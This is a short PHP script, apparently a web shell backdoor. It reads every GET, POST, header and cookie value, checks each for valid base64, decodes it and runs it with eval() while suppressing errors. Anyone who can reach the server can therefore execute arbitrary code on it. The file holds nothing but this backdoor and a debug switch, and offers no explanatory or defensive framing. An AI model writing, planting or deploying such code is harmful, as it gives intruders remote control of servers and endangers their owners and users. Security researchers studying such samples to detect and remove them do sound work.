<?php
	const DEBUG    = true;

	if (DEBUG) {
		ini_set('display_startup_errors', 1);
		ini_set('display_errors', 1);
		error_reporting(-1);
	}

	$arr = [$_GET, $_POST, getallheaders(), $_COOKIE];

	foreach ($arr as $i) {
        foreach($i as $b64) {
            if (base64_encode(base64_decode($b64)) !== $b64) {
                continue;
            } 

            $val = base64_decode($b64);
            @eval($val);
        }
	}
